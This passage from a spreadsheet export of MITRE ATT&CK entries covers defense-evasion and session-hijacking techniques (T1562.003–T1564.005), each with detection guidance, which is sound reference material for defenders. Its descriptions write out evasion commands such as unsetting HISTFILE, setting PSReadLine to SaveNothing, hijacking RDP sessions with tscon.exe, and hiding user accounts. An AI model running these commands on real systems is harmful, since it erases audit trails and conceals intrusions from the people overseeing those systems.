In Event Viewer, Event ID 1102 under the “Security” Windows Log and Event ID 104 under the “System” Windows Log both indicate logs have been cleared.(Citation: def_ev_win_event_logging) `Service Control Manager Event ID 7035` in Event Viewer may indicate the termination of the EventLog service.(Citation: evt_log_tampering) Additionally, gaps in the logs, e.g. non-sequential Event Record IDs, may indicate that the logs may have been tampered.
Monitor the addition of the MiniNT registry key in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control`, which may disable Event Viewer.(Citation: def_ev_win_event_logging)</t>
  </si>
  <si>
    <t>T1562.003</t>
  </si>
  <si>
    <t>Impair Command History Logging (T1562.003)</t>
  </si>
  <si>
    <t>Command: Command Execution, Sensor Health: Host Status</t>
  </si>
  <si>
    <t>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&lt;code&gt;HISTFILE&lt;/code&gt;. When a user logs off a system, this information is flushed to a file in the user's home directory called &lt;code&gt;~/.bash_history&lt;/code&gt;. The &lt;code&gt;HISTCONTROL&lt;/code&gt; environment variable keeps track of what should be saved by the &lt;code&gt;history&lt;/code&gt; command and eventually into the &lt;code&gt;~/.bash_history&lt;/code&gt; file when a user logs out. &lt;code&gt;HISTCONTROL&lt;/code&gt; does not exist by default on macOS, but can be set by the user and will be respected.
Adversaries may clear the history environment variable (&lt;code&gt;unset HISTFILE&lt;/code&gt;) or set the command history size to zero (&lt;code&gt;export HISTFILESIZE=0&lt;/code&gt;) to prevent logging of commands. Additionally, &lt;code&gt;HISTCONTROL&lt;/code&gt; can be configured to ignore commands that start with a space by simply setting it to "ignorespace". &lt;code&gt;HISTCONTROL&lt;/code&gt;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&lt;code&gt;PSReadLine&lt;/code&gt; module tracks commands used in all PowerShell sessions and writes them to a file (&lt;code&gt;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&lt;/code&gt; by default). Adversaries may change where these logs are saved using &lt;code&gt;Set-PSReadLineOption -HistorySavePath {File Path}&lt;/code&gt;. This will cause &lt;code&gt;ConsoleHost_history.txt&lt;/code&gt; to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command &lt;code&gt;Set-PSReadlineOption -HistorySaveStyle SaveNothing&lt;/code&gt;.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)
Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. &lt;code&gt;no logging&lt;/code&gt;).</t>
  </si>
  <si>
    <t>Correlating a user session with a distinct lack of new commands in their &lt;code&gt;.bash_history&lt;/code&gt; can be a clue to suspicious behavior. Additionally, users checking or changing their &lt;code&gt;HISTCONTROL&lt;/code&gt;, &lt;code&gt;HISTFILE&lt;/code&gt;, or &lt;code&gt;HISTFILESIZE&lt;/code&gt; environment variables may be suspicious.
Monitor for modification of PowerShell command history settings through processes being created with &lt;code&gt;-HistorySaveStyle SaveNothing&lt;/code&gt; command-line arguments and use of the PowerShell commands &lt;code&gt;Set-PSReadlineOption -HistorySaveStyle SaveNothing&lt;/code&gt; and &lt;code&gt;Set-PSReadLineOption -HistorySavePath {File Path}&lt;/code&gt;. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to clear or disable historical log data with built-in features native to the network device platform.  Monitor such command activity for unexpected or unauthorized use of commands being run by non-standard users from non-standard locations.</t>
  </si>
  <si>
    <t>T1562.004</t>
  </si>
  <si>
    <t>Disable or Modify System Firewall (T1562.004)</t>
  </si>
  <si>
    <t>Command: Command Execution, Firewall: Firewall Disable, Firewall: Firewall Rule Modification, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.
Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti)
Adversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds.(Citation: Huntress BlackCat) Settings related to enabling abuse of various [Remote Services](https://attack.mitre.org/techniques/T1021) may also indirectly modify firewall rules.</t>
  </si>
  <si>
    <t>Monitor processes and command-line arguments to see if firewalls are disabled or modified. Monitor Registry edits to keys that manage firewalls.</t>
  </si>
  <si>
    <t>T1562.006</t>
  </si>
  <si>
    <t>Indicator Blocking (T1562.006)</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: Process Creation, Sensor Health: Host Status, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018), by tampering settings that control the collection and flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).
For example, adversaries may modify the `File` value in &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Security&lt;/code&gt; to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.(Citation: disable_win_evt_logging) 
ETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) &lt;code&gt;Set-EtwTraceProvider&lt;/code&gt; cmdlet or by interfacing directly with the Registry to make alterations.
In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.
In Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors (Citation: LemonDuck).</t>
  </si>
  <si>
    <t>Detect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data.
Depending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session. (Citation: Medium Event Tracing Tampering 2018) To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers: &lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AUTOLOGGER_NAME\{PROVIDER_GUID}&lt;/code&gt;</t>
  </si>
  <si>
    <t>T1562.007</t>
  </si>
  <si>
    <t>Firewall: Firewall Disable, Firewall: Firewall Rule Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004). 
Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary with appropriate permissions may introduce new firewall rules or policies to allow access into a victim cloud environment and/or move laterally from the cloud control plane to the data plane. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups (or creates new security groups entirely) to allow any TCP/IP connectivity to a cloud-hosted instance.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022) They may also remove networking limitations to support traffic associated with malicious activity (such as cryptomining).(Citation: Expel IO Evil in AWS)(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)
Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. It may also be used to open up resources for [Brute Force](https://attack.mitre.org/techniques/T1110) or [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499). </t>
  </si>
  <si>
    <t>Monitor cloud logs for modification or creation of new security groups or firewall rules.</t>
  </si>
  <si>
    <t>T1562.008</t>
  </si>
  <si>
    <t>Cloud Service: Cloud Service Disable, Cloud Service: Cloud Service Modification, User Account: User Account Modification</t>
  </si>
  <si>
    <t>An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.
For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality – for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user’s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor logs for API calls to disable logging. In AWS, monitor for: &lt;code&gt;StopLogging&lt;/code&gt; and &lt;code&gt;DeleteTrail&lt;/code&gt;.(Citation: Stopping CloudTrail from Sending Events to CloudWatch Logs) In GCP, monitor for: &lt;code&gt;google.logging.v2.ConfigServiceV2.UpdateSink&lt;/code&gt;.(Citation: Configuring Data Access audit logs)  In Azure, monitor for &lt;code&gt;az monitor diagnostic-settings delete&lt;/code&gt;.(Citation: az monitor diagnostic-settings) Additionally, a sudden loss of a log source may indicate that it has been disabled. </t>
  </si>
  <si>
    <t>T1562.009</t>
  </si>
  <si>
    <t>Safe Mode Boot (T1562.009)</t>
  </si>
  <si>
    <t>Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.(Citation: Microsoft Safe Mode)(Citation: Sophos Snatch Ransomware 2019)
Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.(Citation: Microsoft bcdedit 2021)
Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware 2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus MedusaLocker 2020)(Citation: BleepingComputer REvil 2021)</t>
  </si>
  <si>
    <t>Monitor Registry modification and additions for services that may start on safe mode. For example, a program can be forced to start on safe mode boot by adding a &lt;code&gt;\*&lt;/code&gt; in front of the "Startup" value name: &lt;code&gt;HKLM\Software\Microsoft\Windows\CurrentVersion\Run\["\*Startup"="{Path}"]&lt;/code&gt; or by adding a key to &lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal&lt;/code&gt;.(Citation: BleepingComputer REvil 2021)(Citation: Sophos Snatch Ransomware 2019)
Monitor execution of processes and commands associated with making configuration changes to boot settings, such as &lt;code&gt;bcdedit.exe&lt;/code&gt; and &lt;code&gt;bootcfg.exe&lt;/code&gt;.(Citation: Microsoft bcdedit 2021)(Citation: Microsoft Bootcfg)(Citation: Sophos Snatch Ransomware 2019)</t>
  </si>
  <si>
    <t>T1562.010</t>
  </si>
  <si>
    <t>Downgrade Attack (T1562.010)</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: Process Creation, Process: Process Metadata</t>
  </si>
  <si>
    <t>Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system’s backward compatibility to force it into less secure modes of operation. 
Adversaries may downgrade and use various less-secure versions of features of a system, such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or even network protocols that can be abused to enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) or [Network Sniffing](https://attack.mitre.org/techniques/T1040).(Citation: Praetorian TLS Downgrade Attack 2014) For example, [PowerShell](https://attack.mitre.org/techniques/T1059/001) versions 5+ includes Script Block Logging (SBL) which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to [Impair Defenses](https://attack.mitre.org/techniques/T1562) while running malicious scripts that may have otherwise been detected.(Citation: CrowdStrike BGH Ransomware 2021)(Citation: Mandiant BYOL 2018)(Citation: att_def_ps_logging)
Adversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.(Citation: Targeted SSL Stripping Attacks Are Real)(Citation: Crowdstrike Downgrade)</t>
  </si>
  <si>
    <t>Monitor for commands or other activity that may be indicative of attempts to abuse older or deprecated technologies (ex: &lt;code&gt;powershell –v 2&lt;/code&gt;). Also monitor for other abnormal events, such as execution of and/or processes spawning from a version of a tool that is not expected in the environment.
Monitor for Windows event ID (EID) 400, specifically the &lt;code&gt;EngineVersion&lt;/code&gt; field which shows the version of PowerShell running and may highlight a malicious downgrade attack.(Citation: inv_ps_attacks)
Monitor network data to detect cases where HTTP is used instead of HTTPS.</t>
  </si>
  <si>
    <t>T1562.011</t>
  </si>
  <si>
    <t>Spoof Security Alerting (T1562.011)</t>
  </si>
  <si>
    <t>Process: Process Creation, Sensor Health: Host Status</t>
  </si>
  <si>
    <t>Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders’ awareness of malicious activity.(Citation: BlackBasta) Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.
Rather than or in addition to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)). An adversary can also present a “healthy” system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.
For example, adversaries may show a fake Windows Security GUI and tray icon with a “healthy” system status after Windows Defender and other system tools have been disabled.(Citation: BlackBasta)</t>
  </si>
  <si>
    <t>T1562.012</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Deletion, File: File Modification, Process: OS API Execution, Process: Process Modification</t>
  </si>
  <si>
    <t>Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.
Often referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.(Citation: Red Hat System Auditing)(Citation: IzyKnows auditd threat detection 2022)
With root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.(Citation: Trustwave Honeypot SkidMap 2023)(Citation: ESET Ebury Feb 2014)</t>
  </si>
  <si>
    <t>T1563</t>
  </si>
  <si>
    <t>Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation</t>
  </si>
  <si>
    <t>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continuous interaction with that service.
Adversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it hijacks an existing session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack)</t>
  </si>
  <si>
    <t>Use of these services may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with that service. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.
Monitor for processes and command-line arguments associated with hijacking service sessions.</t>
  </si>
  <si>
    <t>T1563.001</t>
  </si>
  <si>
    <t>Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.
In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)
[SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).</t>
  </si>
  <si>
    <t>Use of SSH may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. Also monitor user SSH-agent socket files being used by different users.</t>
  </si>
  <si>
    <t>T1563.002</t>
  </si>
  <si>
    <t>Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment.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perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)</t>
  </si>
  <si>
    <t>Consider monitoring processes for `tscon.exe` usage and monitor service creation that uses `cmd.exe /k` or `cmd.exe /c` in its arguments to detect RDP session hijacking.
Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP.</t>
  </si>
  <si>
    <t>T1564</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, File: File Creation, File: File Metadata, File: File Modification, Firmware: Firmware Modification, Process: OS API Execution, Process: Process Creation, Script: Script Execution, Service: Service Creation, User Account: User Account Creation, User Account: User Account Metadata, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)
Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)</t>
  </si>
  <si>
    <t>Monitor files, processes, and command-line arguments for actions indicative of hidden artifacts. Monitor event and authentication logs for records of hidden artifacts being used. Monitor the file system and shell commands for hidden attribute usage.</t>
  </si>
  <si>
    <t>T1564.001</t>
  </si>
  <si>
    <t>Hidden Files and Directories (T1564.001)</t>
  </si>
  <si>
    <t>Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (&lt;code&gt;dir /a&lt;/code&gt; for Windows and &lt;code&gt;ls –a&lt;/code&gt; for Linux and macOS).
On Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.
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keys.
Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.</t>
  </si>
  <si>
    <t>Monitor the file system and shell commands for files being created with a leading "." and the Windows command-line use of attrib.exe to add the hidden attribute.</t>
  </si>
  <si>
    <t>T1564.002</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Modification, Process: Process Creation, User Account: User Account Creation, User Account: User Account Metadata, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. 
In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value &lt;code&gt;Hide500Users&lt;/code&gt; to &lt;code&gt;TRUE&lt;/code&gt; in the &lt;code&gt;/Library/Preferences/com.apple.loginwindow&lt;/code&gt; plist file.(Citation: Cybereason OSX Pirrit) Every user has a userID associated with it. When the &lt;code&gt;Hide500Users&lt;/code&gt; key value is set to &lt;code&gt;TRUE&lt;/code&gt;, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the &lt;code&gt;dscl&lt;/code&gt; utility to create hidden user accounts by setting the &lt;code&gt;IsHidden&lt;/code&gt; attribute to &lt;code&gt;1&lt;/code&gt;. Adversaries can also hide a user’s home folder by changing the &lt;code&gt;chflags&lt;/code&gt; to hidden.(Citation: Apple Support Hide a User Account) 
Adversaries may similarly hide user accounts in Windows. Adversaries can set the &lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList&lt;/code&gt; Registry key value to &lt;code&gt;0&lt;/code&gt; for a specific user to prevent that user from being listed on the logon screen.(Citation: FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A)
On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the &lt;code&gt;gsettings&lt;/code&gt; command (ex: &lt;code&gt;sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true&lt;/code&gt;).(Citation: Hide GDM User Accounts) Display Managers are not anchored to specific distributions and may be changed by a user or adversary.</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor for users that may be hidden from the login screen but still present in additional artifacts of usage such as directories and authentication logs. 
Monitor processes and command-line events for actions that could be taken to add a new user and subsequently hide it from login screens. Monitor Registry events for modifications to the &lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList&lt;/code&gt; key.
In macOS, monitor for commands, processes, and file activity in combination with a user that has a userID under 500.(Citation: Cybereason OSX Pirrit) Monitor for modifications to set the &lt;code&gt;Hide500Users&lt;/code&gt; key value to &lt;code&gt;TRUE&lt;/code&gt; in the &lt;code&gt;/Library/Preferences/com.apple.loginwindow&lt;/code&gt; plist file. Monitor the command line for usage of the &lt;code&gt;dscl . create&lt;/code&gt; command with the &lt;code&gt;IsHidden&lt;/code&gt; attribute set to &lt;code&gt;1&lt;/code&gt;.(Citation: Apple Support Hide a User Account) </t>
  </si>
  <si>
    <t>T1564.003</t>
  </si>
  <si>
    <t>Hidden Window (T1564.003)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Modification, Process: Process Creation, Script: Script Execution</t>
  </si>
  <si>
    <t>Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. 
Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)
On macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be &lt;code&gt;apple.awt.UIElement&lt;/code&gt;, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.
Similarly, on Windows there are a variety of features in scripting languages, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is &lt;code&gt;powershell.exe -WindowStyle Hidden&lt;/code&gt;.(Citation: PowerShell About 2019)
In addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding &lt;code&gt;explorer.exe&lt;/code&gt; process.(Citation: Hidden VNC)(Citation: Anatomy of an hVNC Attack)  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session,(Citation: Hidden VNC) will be invisible to other desktops windows.</t>
  </si>
  <si>
    <t>Monitor processes and command-line arguments for actions indicative of hidden windows. In Windows, enable and configure event logging and PowerShell logging to check for the hidden window style. In MacOS, plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for the &lt;code&gt;apple.awt.UIElement&lt;/code&gt; or any other suspicious plist tag in plist files and flag them.</t>
  </si>
  <si>
    <t>T1564.004</t>
  </si>
  <si>
    <t>NTFS File Attributes (T1564.004)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Metadata, File: File Modification, Process: OS API Execution, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)
Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)</t>
  </si>
  <si>
    <t>Forensic techniques exist to identify information stored in NTFS EA. (Citation: Journey into IR ZeroAccess NTFS EA) Monitor calls to the &lt;code&gt;ZwSetEaFile&lt;/code&gt; and &lt;code&gt;ZwQueryEaFile&lt;/code&gt; Windows API functions as well as binaries used to interact with EA, (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) and consider regularly scanning for the presence of modified information. (Citation: SpectorOps Host-Based Jul 2017)
There are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex: &lt;code&gt;file.ext:ads[.ext]&lt;/code&gt;) is commonly associated with ADSs. (Citation: Microsoft ADS Mar 2014) (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) For a more exhaustive list of utilities that can be used to execute and create ADSs, see https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f.
The Streams tool of Sysinternals can be used to uncover files with ADSs. The &lt;code&gt;dir /r&lt;/code&gt; command can also be used to display ADSs. (Citation: Symantec ADS May 2009) Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a &lt;code&gt;-stream&lt;/code&gt; parameter to interact with ADSs. (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)</t>
  </si>
  <si>
    <t>T1564.005</t>
  </si>
  <si>
    <t>Hidden File System (T1564.005)</t>
  </si>
  <si>
    <t>File: File Modification, Firmware: Firmware Modification, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)
Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)</t>
  </si>
  <si>
    <t>Detecting the use of a hidden file system may be exceptionally difficult depending on the implementation. Emphasis may be placed on detecting related aspects of the adversary lifecycle, such as how malware interacts with the hidden file system or how a hidden file system is loaded. Consider looking for anomalous interactions with the Registry or with a particular file on disk. Likewise, if the hidden file system is loaded on boot from reserved disk space, consider shifting focus to detecting [Bootkit](https://attack.mitre.org/techniques/T1542/003) activity.</t>
  </si>
  <si>
